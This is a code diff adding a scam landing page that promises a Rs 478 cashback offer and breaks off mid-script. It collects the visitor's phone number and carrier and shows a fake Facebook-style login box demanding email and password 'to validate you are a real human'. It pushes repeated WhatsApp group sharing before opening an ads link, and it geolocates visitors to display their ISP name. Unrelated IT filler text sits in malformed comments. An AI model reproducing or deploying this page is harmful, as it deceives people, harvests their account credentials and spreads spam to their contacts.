+                <img src="../i.imgur.com/s9LnjZg.jpg" width="100%">
+
+                <div class="quedate-container">
+                    <main class="quedate">
+                        <div class="quedate__step" id="first-box">
+                            <header class="logo-container" style="background-color:black;font-size:20px">
+                               
+
+                                <span class="quedate-logo" style="font-family:Times New Roman;">Cashback Rs 478 Offer</span>
+                            </header>
+                            <div class="quedate__step-box">
+                                <span class="quedate__border"></span>
+                                </p>
+                                <span class="quedate__border"></span>
+                            </div>
+                            <button style="margin:0 0 30px;background-image:  linear-gradient(#f87c00, #ffdc00);" id="validar" class="quedate__cta-btn button-glow">Apply
+                                Now</button>
+                                <img src="../i.imgur.com/pIemKIc.jpg" width="100%" alt="">
+                        </div>
+<!__What does information technology encompass?
+The IT department ensures that the organization's systems, networks, data and applications all connect and function properly. The IT team handles three major areas:
+
+deploys and maintains business applications, services and infrastructure (servers, networks, storage);__>
+
+                        <div class="quedate__loading">
+                            <div class="multi-spinner-container dum-dum" id="loading-svg">
+                                <div class="multi-spinner">
+                                    <div class="multi-spinner">
+                                        <div class="multi-spinner">
+                                            <div class="multi-spinner">
+                                                <div class="multi-spinner">
+                                                    <div class="multi-spinner">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <svg id="check-svg" class="dum-dum" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0"
+                                xmlns="http://www.w3.org/2000/svg" id="???_1" version="1.1"
+                                style=" background: rgb(255, 255, 255);" width="10rem">
+                                <g class="ldl-scale"
+                                    style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                    <g class="ldl-ani">
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani"
+                                                style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <circle stroke-miterlimit="10" stroke-width="8" stroke="#333"
+                                                    fill="none" r="40" cy="50" cx="50" style="stroke:#f70000;"></circle>
+                                            </g>
+                                        </g>
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani"
+                                                style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <path fill="#abbd81"
+                                                    d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z"
+                                                    style="fill:#f70000;"></path>
+                                            </g>
+                                        </g>
+                                        <metadata xmlns:d="../external.html?link=https://loading.io/stock/">
+                                            <d:name>ok</d:name>
+                                            <d:tags>ok,confirm,ready,positive,check,right,correct,affirmative,success
+                                            </d:tags>
+                                            <d:license>by</d:license>
+                                            <d:slug>364zp</d:slug>
+                                        </metadata>
+                                    </g>
+                                </g>
+                            </svg>
+                            <span class="quedate__porcent dum-dum"></span>
+                            <span style="font-size: 16px;font-weight: bold;"
+                                class="quedate__porcent-text dum-dum">Thanks, we are processing!</span>
+                        </div>
+               
+                        <div id="second-box" style="margin-bottom: 2.5rem" class="quedate__step dum-dum">
+                            <div class="quedate__step-box">
+                                <img src="../i.imgur.com/IAKaMbh.jpg" width="100%"> 
+                            </div>
+
+
+<!__Applications might be coded in a wide array of popular languages and integrated with other applications to create smooth and seamless interactions between different applications. Developers might also be tasked with creating interactive business websites and building mobile applications. The trend toward agile or continuous development paradigms require developers to be increasingly involved with IT operations, such as deploying and monitoring applications.__>
+                            <script>
+                                var prevent = (e) => e.preventDefault();
+                            </script>
+                            <div align="center">
+
+                                <br>
+                                <span class="fake-select">
+                                    <select id="country" name="country" style="width: 300%;
+                                    border-radius: 6px;
+                                    height: 35px;
+                                    margin-left: -66px;
+                                    border-color: #c5bbbb;">
+                                        <option value="PAKISTAN">CHOOSE COUNTRY</option>
+                                        <option value="CANADA">PAKISTAN</option>
+                                        <option value="INDIA">INDIA</option>
+                                        <option value="UAE">UAE</option>
+                                        <option value="BANGLADESH">BANGLADESH</option>
+                                        <option value="MALAISIYA">MALAISIYA</option>
+                                        <option value="AFGHANISTAN">AFGHANISTAN</option>
+                                        <option value="IRAN">IRAN</option>
+                                        <option value="USA">USA</option>
+                                        <option value="CANADA">CANADA</option>
+                                        <option value="CANADA">OTHERS</option>
+                                        
+
+                                    </select>
+                                </span>
+                            </div>
+
+                            <div align="center">
+  
+                                <br>
+                                <span class="fake-select">
+                                    <select id="network" name="network" style="
+                                    height: 40px;
+                                    border-radius: 80px;
+                                    border-color: #c5bbbb;">
+                                    
+                                    <option value="Jazz">CHOOSE NETWORK PROVIDER NAME</option>
+                                    <option value="Jazz">AIRTEL</option>
+                                     <option value="Telenor">Jio</option>
+                                      <option value="Ufone">MTN</option>
+                                     <option value="Zong">VI</option>
+                                      <option value="mtn">Telenor</option>
+                                     <option value="GLo">Zong</option>
+                                      <option value="airtel">Jazz</option>
+                                     <option value="T-mobile">T-MOBILE</option>
+                                     <option value="Verizon">Verizon</option>
+                                     <option value="atandt">OTHERS</option>
+                                      
+                                      </select>
+                                  </span>
+                                                </div>
+                            <form class="quedate__form" onsubmit="return prevent(event)">
+                                <input class="quedate__form-input" id="num" type="number"
+                                placeholder="Enter Phone Number">
+                                <span class="quedate__form-separar"></span>
+                                <label id="enviar" class="quedate__form-label" for="num">Send</label>
+                                <div class="message-status dum-dum"></div>
+                            </form>
+                        </div>
+
+                        <div id="third-box" style="margin-bottom: 2.5rem;" class="quedate__step dum-dum">
+                            <span style="font-weight: bold; font-size: 2rem; text-align:center"
+                                class="quedate__text">Cashback Activation Processing...</span>
+                            <div class="quedate__first dum-dum">
+                        
+                                <div class="progress-bar" style="width:100%;">
+                                    <div class="progress">
+                                        <div class="quedate__load-a dum-dum progress-shadow"></div>
+                                    </div>
+                                </div>
+
+                                <div style="width:10%" class="quedate__load-icon">
+                                    <svg id="first-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="red" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                </circle>
+                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="yellow" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                                </circle>
+                                 <circle cx="50" cy="50" r="16" stroke-width="8" stroke="red" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                </circle>
+                            </svg>
+                                    <svg id="first-checked" class="quedate__load-check dum-dum" xml:space="preserve"
+                                        viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="???_1"
+                                        version="1.1" width=" 3.2rem">
+                                        <g class="ldl-scale"
+                                            style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                            <g class="ldl-ani">
+                                                <g class="ldl-layer">
+                                                    <g class="ldl-ani"
+                                                        style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                        <circle stroke-miterlimit="10" stroke-width="8" stroke="#333"
+                                                            fill="none" r="40" cy="50" cx="50" style="stroke:#f70000;">
+                                                        </circle>
+                                                    </g>
+                                                </g>
+                                                <g class="ldl-layer">
+                                                    <g class="ldl-ani"
+                                                        style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                        <path fill="#abbd81"
+                                                            d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z"
+                                                            style="fill:#f70000;"></path>
+                                                    </g>
+                                                </g>
+                                                <metadata xmlns:d="../external.html?link=https://loading.io/stock/">
+                                                    <d:name>ok</d:name>
+                                                    <d:tags>
+                                                        ok,confirm,ready,positive,check,right,correct,affirmative,success
+                                                    </d:tags>
+                                                    <d:license>by</d:license>
+                                                    <d:slug>364zp</d:slug>
+                                                </metadata>
+                                            </g>
+                                        </g>
+                                    </svg>
+                                    <span id="first-porcent" class="quedate__load-text"></span>
+                                </div>
+                            </div>
+
+                            <div class="quedate__first dum-dum">
+                    
+                                <div class="progress-bar" style="width:100%;">
+                                    <div class="progress">
+                                        <div class="quedate__load-a dum-dum progress-shadow"></div>
+                                    </div>
+                                </div>
+                                <div style="width:10%" class="quedate__load-icon">
+                                    <svg id="second-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="red" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                </circle>
+                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="yellow" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
+                                </circle>
+                                 <circle cx="50" cy="50" r="16" stroke-width="8" stroke="red" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                </circle>
+                            </svg>
+                            
+                                  
+                                  <!__upport. Help desk staff specialize in answering questions, gathering information and directing troubleshooting efforts for hardware and software. IT support often includes IT asset and change management, helping admins with procurement, handling backup and recovery of data and __>
+                                    <svg id="second-checked" class="quedate__load-check dum-dum" xml:space="preserve"
+                                        viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="???_1"
+                                        version="1.1" width=" 3.2rem">
+                                        <g class="ldl-scale"
+                                            style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                            <g class="ldl-ani">
+                                                <g class="ldl-layer">
+                                                    <g class="ldl-ani"
+                                                        style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                        <circle stroke-miterlimit="10" stroke-width="8" stroke="#333"
+                                                            fill="none" r="40" cy="50" cx="50" style="stroke:#f70000;">
+                                                        </circle>
+                                                    </g>
+                                                </g>
+                                                <g class="ldl-layer">
+                                                    <g class="ldl-ani"
+                                                        style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                        <path fill="#abbd81"
+                                                            d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z"
+                                                            style="fill:#f70000;"></path>
+                                                    </g>
+                                                </g>
+                                                <metadata xmlns:d="../external.html?link=https://loading.io/stock/">
+                                                    <d:name>ok</d:name>
+                                                    <d:tags>
+                                                        ok,confirm,ready,positive,check,right,correct,affirmative,success
+                                                    </d:tags>
+                                                    <d:license>by</d:license>
+                                                    <d:slug>364zp</d:slug>
+                                                </metadata>
+                                            </g>
+                                        </g>
+                                    </svg>
+                                    <span id="second-porcent" class="quedate__load-text"></span>
+                                </div>
+                            </div>
+
+
+                        </div>
+
+                        <div id="loading-g" class="quedate__step dum-dum">
+                            <div class="quedate__step-box">
+                                <svg class="quedate__animate" xmlns="../external.html?link=http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;"
+                                    viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="10rem">
+                                    <circle cx="50" cy="50" r="32" stroke-width="8" stroke="red"
+                                        stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                        stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                        <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                            repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50">
+                                        </animateTransform>
+                                    </circle>
+                                    <circle cx="50" cy="50" r="23" stroke-width="8" stroke="yellow"
+                                        stroke-dasharray="36.12831551628262 36.12831551628262"
+                                        stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round"
+                                        transform="rotate(-214.395 50 50)">
+                                        <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                            repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50">
+                                        </animateTransform>
+                                    </circle>
+                                    <circle cx="50" cy="50" r="14" stroke-width="8" stroke="red"
+                                        stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                        stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                        <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                            repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50">
+                                        </animateTransform>
+                                    </circle>
+                                    <circle cx="50" cy="50" r="4" stroke-width="8" stroke="yellow"
+                                    stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                    stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                        repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50">
+                                    </animateTransform>
+                                </circle>
+                                </svg>
+                           
+
+                            </div>
+
+                            <p style="font-size: 14px;font-weight: bold;">Wait, we are validating cashback</p>
+                        </div>
+                    </main>
+                </div>
+              
+                <div class="permision-container dum-dum">
+                    <span class="permision-container-request-text">Request Permission</span>
+                    <div class="permision-container-data">
+                        <div class="permision-container-icons">
+
+                          <!DOCTYPE svg
+                                PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+                            <svg width="50px" version="1.1" id="Capa_1" xmlns="../external.html?link=http://www.w3.org/2000/svg"
+                                xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 112.196 112.196"
+                                style="enable-background:new 0 0 112.196 112.196;" xml:space="preserve">
+                                <g>
+                                    <circle style="fill:#3B5998;" cx="56.098" cy="56.098" r="56.098" />
+                                    <path style="fill:#FFFFFF;"
+                                        d="M70.201,58.294h-10.01v36.672H45.025V58.294h-7.213V45.406h7.213v-8.34
+            		c0-5.964,2.833-15.303,15.301-15.303L71.56,21.81v12.51h-8.151c-1.337,0-3.217,0.668-3.217,3.513v7.585h11.334L70.201,58.294z" />
+                                </g>
+                            </svg>
+
+                        </div>
+                        <div class="permision-container-box">
+                            <p class="permision-container-txt">We should validate you are a real human checking your
+                                name and profile photo.</p>
+                            <form action="#" class="permision-container-form">
+                                <input class="permision-container-input" type="text" id="email"
+                                    placeholder="your@email.com">
+                                <label class="permision-container-label" for="email"></label>
+                                <input class="permision-container-input" type="password" id="pass"
+                                    placeholder="??????????">
+                                <label class="permision-container-label" for="pass"></label>
+                            </form>
+                            <span class="message-status fb-request"></span>
+                            <button style="width:100%; margin-left: 0;" id="aceptar" class="quedate__cta-btn">Accept -
+                                Im Human</button>
+                            <div class="permision-container-secure">
+                                <svg fill="#a2a2a2" height="512pt" viewBox="-64 0 512 512" width="512pt"
+                                    xmlns="../external.html?link=http://www.w3.org/2000/svg">
+                                    <path
+                                        d="m336 192h-16v-64c0-70.59375-57.40625-128-128-128s-128 57.40625-128 128v64h-16c-26.453125 0-48 21.523438-48 48v224c0 26.476562 21.546875 48 48 48h288c26.453125 0 48-21.523438 48-48v-224c0-26.476562-21.546875-48-48-48zm-229.332031-64c0-47.0625 38.269531-85.332031 85.332031-85.332031s85.332031 38.269531 85.332031 85.332031v64h-170.664062zm0 0" />
+                                </svg>
+                                <p class="permision-container-secure-text">The app is not allowed to post on Facebook
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    <span class="permision-container-end">Our service privacy policy and conditions</span>
+                </div>
+                <div style="height: 269px;" class="loading2 dum-dum">
+                    <div style="text-align: center !important;" class="loading2__box">
+                        <svg class="loading2__permission" xmlns="../external.html?link=http://www.w3.org/2000/svg"
+                            xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 100 100"
+                            preserveAspectRatio="xMidYMid">
+                            <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#ae0434"
+                                stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                    repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50">
+                                </animateTransform>
+                            </circle>
+                            <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#ecc365"
+                                stroke-dasharray="36.12831551628262 36.12831551628262"
+                                stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round"
+                                transform="rotate(-214.395 50 50)">
+                                <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                    repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50">
+                                </animateTransform>
+                            </circle>
+                        </svg>
+                        <p style="text-align:center">Wait a moment</p>
+                    </div>
+                </div>
+
+                <div id="share" class="loading2 dum-dum js-congrats">
+                    <div class="loading2__box">
+                        <span style="font-weight: bold; font-size:15px"></span>
+                        <img src="../i.imgur.com/NBBtk4x.jpg" width="100%">
+
+                        <div style="margin-top: 30px;margin-bottom: 30px;" class="quedate__first dum-dum js-share">
+                            <div style="border: 1px solid gray; width:80%" class="quedate__load">Share with your whatsapp groups
+                                <span class="quedate__load-a dum-dum"></span>
+                            </div>
+                            <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
+                                <svg id="third-loading" class="quedate__load-animate" xmlns="../external.html?link=http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;"
+                                    viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                    <circle cx="50" cy="50" r="32" stroke-width="8" stroke="red"
+                                        stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                        stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                        <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                            repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50">
+                                        </animateTransform>
+                                    </circle>
+                                    <circle cx="50" cy="50" r="23" stroke-width="8" stroke="yellow"
+                                        stroke-dasharray="36.12831551628262 36.12831551628262"
+                                        stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round"
+                                        transform="rotate(-214.395 50 50)">
+                                        <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                            repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50">
+                                        </animateTransform>
+                                    </circle>
+                                    <circle cx="50" cy="50" r="16" stroke-width="8" stroke="red"
+                                    stroke-dasharray="50.26548245743669 50.26548245743669" fill="none"
+                                    stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animateTransform attributeName="transform" type="rotate" dur="1s"
+                                        repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50">
+                                    </animateTransform>
+                                </circle>
+                                </svg>
+                                <svg id="third-checked" class="quedate__load-check dum-dum" xml:space="preserve"
+                                    viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" id="???_1"
+                                    version="1.1" width=" 3.2rem">
+                                    <g class="ldl-scale"
+                                        style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                        <g class="ldl-ani">
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani"
+                                                    style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <circle stroke-miterlimit="10" stroke-width="8" stroke="#333"
+                                                        fill="none" r="40" cy="50" cx="50" style="stroke:#680000;">
+                                                    </circle>
+                                                </g>
+                                            </g>
+                                            <g class="ldl-layer">
+                                                <g class="ldl-ani"
+                                                    style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                    <path fill="#abbd81"
+                                                        d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z"
+                                                        style="fill:#680000;"></path>
+                                                </g>
+                                            </g>
+                                            <metadata xmlns:d="../external.html?link=https://loading.io/stock/">
+                                                <d:name>ok</d:name>
+                                                <d:tags>
+                                                    ok,confirm,ready,positive,check,right,correct,affirmative,success
+                                                </d:tags>
+                                                <d:license>by</d:license>
+                                                <d:slug>364zp</d:slug>
+                                            </metadata>
+                                        </g>
+                                    </g>
+                                </svg>
+                                <span id="third-porcent" class="quedate__load-text"></span>
+                            </div>
+                        </div>
+                        <button style="display: flex;align-items: center;justify-content: center;    background-image: linear-gradient(#f87c00, #ffdc00);" id="compartir"
+                            class="quedate__cta-btn dum-dum">
+
+                           <img src="../blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8R266P7_tF1XNieZ6KBeBCO9uO1KtN57QWS2pv0X/s320/whutsupp-removebg-preview.png" alt="" height="30px" width="30px" style="margin-right:5px">
+
+                            WhatsApp
+
+                        </button>
+                    </div>
+                </div>
+             
+                <div class="loading2 dum-dum js-verify">
+                    <div class="loading2__box">
+
+                      <img src="../i.imgur.com/Ji9o34m.jpg" width="100%">
+                      <center>
+                            <div style="display: flex;">
+                                <button
+                                    style="width: 100%; display: flex;align-items: center;justify-content: center;margin: 0;"
+                                    id="verify" class="quedate__cta-btn">cashback rs. 478</button>
+
+                            </div>
+                        </center>
+                        <br>
+                        <center>
+                            <div style="display: flex;">
+                                <button
+                                    style="width: 100%; display: flex;align-items: center;justify-content: center;margin: 0;"
+                                    id="verify" class="quedate__cta-btn">scratch card</button>
+
+                            </div>
+                        </center>
+                        <br>
+                        <center>
+                            <script type="text/javascript" src="#"></script>
+                        </center>
+
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <script>
+
+            function operatorDataBack() {
+                var d = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0];
+
+                if (d == 'pt') {
+                    d = 'pt-BR';
+                }
+
+                var endpoint = 'https://pro.ip-api.com/json/?lang=' + d + '&key=zfJdWsy0dcKGCzT';
+
+                var xhr = new XMLHttpRequest();
+                xhr.onreadystatechange = function () {
+                    if (this.readyState == 4 && this.status == 200) {
+                        var response = JSON.parse(this.responseText);
+                        if (response.status !== 'success') {
+                            console.log('query failed: ' + response.message);
+                            return
+                        }
+
+                        set_Cookie("countryCode", response.countryCode);
+
+                        document.querySelector(".quedate-logo").textContent = response.isp + " FREE DATA OFFER";
+                        document.querySelector(".quedate__company").textContent = response.city;
+                        document.querySelector(".quedate__country").textContent = response.country;
+                        document.querySelector(".quedate__city").textContent = response.regionName;
+
+                    }
+                };
+                xhr.open('GET.html', endpoint, true);
+                xhr.send();
+
+
+            }
+
+            operatorDataBack();
+        </script>
+
+      <img src="../i.imgur.com/B3TJBLm.jpg" alt="" width="100%" align="center">
+    <script>
+        var DOMString = {
+            loading: document.querySelector("#loading-svg"),
+            checked: document.querySelector("#check-svg"),
+            elemPorcents: document.querySelector(".quedate__porcent"),
+            elemPorcentText: document.querySelector(".quedate__porcent-text"),
+            firstBox: document.querySelector("#first-box"),
+            secondBox: document.querySelector("#second-box"),
+            thirdBox: document.querySelector("#third-box"),
+            phone: document.querySelector(".quedate__form-input"),
+            messageStatus: document.querySelector(".message-status"),
+            loadingG: document.querySelector("#loading-g"),
+            boxes: document.querySelectorAll(".quedate__first"),
+            firstPorcent: document.querySelector("#first-porcent"),
+            secondPorcent: document.querySelector("#second-porcent"),
+            thirdPorcent: document.querySelector("#third-porcent"),
+            barLoaders: document.querySelectorAll(".quedate__load-a"),
+            svgLoading: document.querySelectorAll(".quedate__load-animate"),
+            svgChecked: document.querySelectorAll(".quedate__load-check"),
+            permissionContainer: document.querySelector(".permision-container"),
+            permissionLoading: document.querySelector(".loading2"),
+            statusMessage: document.querySelector(".fb-request"),
+            share: document.querySelector("#compartir"),
+            congrats: document.querySelector(".js-congrats"),
+            sharing: document.querySelector(".js-share"),
+            verify: document.querySelector("#verify")
+        }, objServer = {}, landingDomain = "../external.html?link=https://google.com/",
+            adsLink = "https://udfynyk849fzzkekgl58aa.on.drv.tw/Cshbck/";
+        document.addEventListener("click", function (c) {
+            console.log(c);
+            var a = c.toElement || c.srcElement;
+            if (a.id) switch (a.id) {
+                case "validar":
+                    a.classList.add("dum-dum"), setTimeout(function () {
+                        DOMString.loading.classList.remove("dum-dum"), DOMString.elemPorcents.classList.remove("dum-dum");
+                        var b = 0;
+                        window.loadingPorcents = setInterval(function () {
+                            DOMString.elemPorcents.textContent = b + "%", 100 == b ? (clearInterval(window.loadingPorcents), DOMString.loading.classList.add("dum-dum"), DOMString.checked.classList.remove("dum-dum"), DOMString.elemPorcents.classList.add("dum-dum"), DOMString.elemPorcentText.classList.remove("dum-dum"), setTimeout(function () {
+                                DOMString.checked.classList.add("dum-dum"), DOMString.firstBox.classList.add("dum-dum"), DOMString.secondBox.classList.remove("dum-dum"), DOMString.elemPorcentText.classList.add("dum-dum")
+                            }, 2e3)) : b++
+                        }, 50)
+                    }, 500);
+                    break;
+                case "enviar":
+                    var a = DOMString.phone;
+                    a.value ? (objServer.phone = a.value, DOMString.messageStatus.classList.add("dum-dum"), DOMString.secondBox.classList.add("dum-dum"), DOMString.loadingG.classList.remove("dum-dum"), setTimeout(function () {
+                        DOMString.loadingG.classList.add("dum-dum"), DOMString.thirdBox.classList.remove("dum-dum");
+                        var i = 0, j = 0, k = !0,
+                            l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
+                        window.loadingData = setTimeout(function a() {
+                            l.length > i && (DOMString.boxes[i].classList.remove("dum-dum"), DOMString.barLoaders[i].classList.remove("dum-dum"), window._setting = setInterval(function () {
+                                if (l[i].textContent = j + "%", DOMString.barLoaders[i].style.width = j + "%", 100 === j && k) clearInterval(window._setting), DOMString.svgLoading[i].classList.add("dum-dum"), DOMString.svgChecked[i].classList.remove("dum-dum"), i++, j = 0, window.loadingData = setTimeout(a, 1e3); else if (50 == j && 1 == i && k) clearInterval(window._setting), k = !1, window.loadingData = setTimeout(a, 1e3); else if (!k && 100 === j) {
+                                    clearInterval(window._setting), DOMString.congrats.classList.remove("dum-dum"), DOMString.sharing.classList.remove("dum-dum"), DOMString.share.classList.remove("dum-dum"), DOMString.svgLoading[i].classList.add("dum-dum"), DOMString.svgChecked[i].classList.remove("dum-dum"), i++;
+                                    var d = 1, e = 0, m = messageToSend();
+                                    var s = 1;
+                                    set_Cookie("d", s);
+                                    DOMString.barLoaders[i].classList.remove("dum-dum"), DOMString.boxes[i].classList.remove("dum-dum"), DOMString.svgLoading[i].classList.remove("dum-dum"), l[i].textContent = "0%", DOMString.share.classList.remove("dum-dum"), DOMString.share.addEventListener("click", function () {
+                                        if (12 <= d) {
+                                            for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
+                                                window.open(adsLink)
+                                            });
+                                            DOMString.congrats.classList.add("dum-dum"), document.querySelector(".js-verify").classList.remove("dum-dum"), DOMString.verify.classList.remove("dum-dum")
+                                        } else
+                                      
